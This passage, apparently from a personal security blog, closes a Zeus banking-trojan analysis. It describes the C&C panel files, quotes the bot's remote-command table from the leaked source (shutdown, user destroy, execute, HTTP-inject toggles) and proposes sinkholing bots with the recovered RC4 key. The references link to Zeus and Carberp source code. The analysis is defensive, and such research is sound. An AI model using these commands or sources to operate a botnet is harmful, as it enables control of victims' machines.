+the bots: Windows version, user language and time zone, location and
+computer IP, the first and last time of communication with the server,
+time in online.</p>
+
+<p>The root directory includes index.php which is empty to prevent unwanted
+visitors. Two other, namely cp.php and gate.php: cp.php is the user
+control panel to manage the bots, whereas gate.php is the PHP script
+that handles all the communication between bots and C&amp;C server.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image20.png" alt="" /></p>
+
+<p>Figure 23 Zeus control panel and victim’s information</p>
+
+<p>C&amp;C server control the bots by creating a script for them referring to
+<code class="language-plaintext highlighter-rouge">\\\\Zeus\\source\\client\\remotescript.cpp</code>. Fortunately, with our
+results of RC4 key, C&amp;C configuration information, malware analysist can
+take advantages of known Zeus control panel security bugs [13]</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image21.png" alt="" /></p>
+
+<p>Figure 24 Sending control script to victim</p>
+
+<p>Besides, with the list of known scripts command, we can take down the
+malware remotely by reconstruct a sinkhole with RC4 key, configuration
+and send command botUninstall to infected devices.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//Work with the OC.
+
+**{**CryptedStrings**::**id_remotescript_command_os_shutdown**,osShutdown},**
+
+**{**CryptedStrings**::**id_remotescript_command_os_reboot**,osReboot},**
+
+//Working with a bot.
+
+**{**CryptedStrings**::**id_remotescript_command_bot_uninstall**,**botUninstall**},**
+
+**{**CryptedStrings**::**id_remotescript_command_bot_update**,**
+botUpdate**},**
+
+#if(BO_BCSERVER_PLATFORMS \&gt; 0)
+
+**{**CryptedStrings**::**id_remotescript_command_bot_bc_add**,**
+botBcAdd**},**
+
+**{**CryptedStrings**::**id_remotescript_command_bot_bc_remove**,**botBcRemove**},**
+
+#endif
+
+**{**CryptedStrings**::**id_remotescript_command_bot_httpinject_disable**,**botHttpInjectDisable**},**
+
+**{**CryptedStrings**::**id_remotescript_command_bot_httpinject_enable**,**
+botHttpInjectEnable**},**
+
+//Working with faly.
+
+**{**CryptedStrings**::**id_remotescript_command_fs_path_get**,**fsPathGet**},**
+
+**{**CryptedStrings**::**id_remotescript_command_fs_search_add**,**fsSearchAdd**},**
+
+**{**CryptedStrings**::**id_remotescript_command_fs_search_remove**,**fsSearchRemove**},**
+
+//Working with the user.
+
+**{**CryptedStrings**::**id_remotescript_command_user_destroy**,**
+userDestroy**},**
+
+**{**CryptedStrings**::**id_remotescript_command_user_logoff**,**userLogoff**},**
+
+**{**CryptedStrings**::**id_remotescript_command_user_execute**,**
+userExecute**},**
+</code></pre></div></div>
+
+<h1 id="summary">Summary</h1>
+
+<p>Zeus malware contains configuration data which is hardcoded and
+encrypted in the bot binary, contains the URL of a configuration file to
+download, and the RC4 key to decrypt it. Once the configuration file has
+been parsed, the bot reports information and activities about the
+infected computer to the C&amp;C server. The following figure details those
+phases.</p>
+
+<p><img src="/assets/img/arch/zeus.assets/image-20220320213731222.png" alt="image-20220320213731222" /></p>
+
+<p>Figure 25 Zeus initialization and communication phases</p>
+
+<p>Some taint tracking analyses were tested such as minemu [14], a new
+emulator architecture that speeds up dynamic taint analysis, but only
+support Linux 32-bit OS. Unicorn [15], a lightweight CPU emulator
+framework, which native support for both Windows and Linux, was tested.
+The idea is to hook a function which capture the read/write memory
+operations at some specified addresses or read value of rc4 key address
+at some specified location. However, running in an emulator has
+difficulties in declaring external libraries and it is totally different
+from normal environment. Unicorn will be really useful in analyzing
+obfuscated disassembly code, standalone program and shellcode [16].</p>
+
+<p>Another approach to automatically grab the RC4 communication key is
+using Volatility [17] and APIhook to analyze memory dump forensic when
+we already understood the header of decrypted plaintext.</p>
+
+<p><strong>REFERENCES</strong></p>
+
+<p>[1] Wagener, Gérard, Radu State, and Alexandre Dulaunoy. "Malware
+behaviour</p>
+
+<p>analysis." Journal in Computer Virology 4.4 (2008): 279-287.</p>
+
+<p>[2] FakeNet, <a href="https://practicalmalwareanalysis.com/fakenet/">https://practicalmalwareanalysis.com/fakenet/</a></p>
+
+<p>[3] Cuckoo Sanbox, <a href="https://www.cuckoosandbox.org/">https://www.cuckoosandbox.org/</a></p>
+
+<p>[4] PEView
+<a href="http://blog.threatexpert.com/2010/05/config-decryptor-for-zeus-20.html">http://blog.threatexpert.com/2010/05/config-decryptor-for-zeus-20.html</a></p>
+
+<p>[5] PEiD https://www.aldeid.com/wiki/PEiD</p>
+
+<p>[6] IDA https://www.hex-rays.com/products/ida/</p>
+
+<p>[7] RC4, 1996-2000 Whistle Communications, Inc.
+<a href="http://www.opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/crypto/rc4/rc4.c">http://www.opensource.apple.com/source/xnu/xnu-1456.1.26/bsd/crypto/rc4/rc4.c</a></p>
+
+<p>[8] Memory Protection Constants
+<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx</a></p>
+
+<p>[9] Mersenne Twister https://en.wikipedia.org/wiki/Mersenne_Twister</p>
+
+<p>[10] BinDiff http://www.zynamics.com/bindiff.html</p>
+
+<p>[11] Zeus Source code https://github.com/Visgean/Zeus</p>
+
+<p>[12] Carberp Source code https://github.com/hzeroo/Carberp</p>
+
+<p>[13] Zeus Upload vulnerability
+<a href="http://cybercrime-tracker.net/tools.php">http://cybercrime-tracker.net/tools.php</a></p>
+
+<p>[14] Erik Bosman, Asia Slowinska, and Herbert Bos, “Minemu: The
+World’s Fastest Taint Tracker”, RAID'11 Proceedings of the 14th
+international conference on Recent Advances in Intrusion Detection 2011</p>
+
+<p>[15] Nguyen Anh Quynh, “Unicorn: Next Generation CPU Emulator
+Framework”, Black Hat USA 2015</p>
+
+<p>[15] Luc Nguyen, “Phân tích shellcode với PyAna”, Tetcon 2015.</p>
+
+<p>[15] ZUBAIR ASHRAF, “ZEUS ANALYSIS – MEMORY FORENSICS VIA
+VOLATILITY”,
+<a href="https://securityintelligence.com/zeus-analysis-memory-forensics-via-volatility/">https://securityintelligence.com/zeus-analysis-memory-forensics-via-volatility/</a></p>
+
+  </article>
+
+</div>
+
+    </div>
+
+    <!-- Footer -->
+
+    
+<footer class="fixed-bottom">
+  <div class="container mt-0">
+    &copy; Copyright 2025 Duy Phuc  Pham.
+    Powered by <a href="http://jekyllrb.com/" target="_blank">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank">Unsplash</a>.
+
+    
+  </div>
+</footer>
+
+
+
+  </body>
+
+  <!-- jQuery -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
+
+  <!-- Bootsrap & MDB scripts -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.4.4/umd/popper.min.js" integrity="sha512-eUQ9hGdLjBjY3F41CScH3UX+4JDSI9zXeroz7hJ+RteoCaY+GP/LDoM8AO+Pt+DRFw3nXqsjh9Zsts8hnYv8/A==" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha512-M5KW3ztuIICmVIhjSqXe01oV2bpe248gOxqmlcYrEzAvws7Pw3z6BK0iGbrwvdrUQUhi3eXgtxp5I8PDo9YfjQ==" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/js/mdb.min.js" integrity="sha512-Mug9KHKmroQFMLm93zGrjhibM2z2Obg9l6qFG2qKjXEXkMp/VDkI4uju9m4QKPjWSwQ6O2qzZEnJDEeCw0Blcw==" crossorigin="anonymous"></script>
+
+  
+<!-- Mansory & imagesLoaded -->
+<script defer src="https://unpkg.com/masonry-layout@4/dist/masonry.pkgd.min.js"></script>
+<script defer src="https://unpkg.com/imagesloaded@4/imagesloaded.pkgd.min.js"></script>
+<script defer src="/assets/js/mansory.js" type="text/javascript"></script>
+
+
+  
+<!-- Enable Tooltips -->
+<script type="text/javascript">
+$(function () {$('[data-toggle="tooltip"]').tooltip()})
+</script>
+
+
+
+<!-- Load Common JS -->
+<script src="/assets/js/common.js"></script>
+
+<!-- Load DarkMode JS -->
+<script src="/assets/js/dark_mode.js"></script>
+
+
+</html>
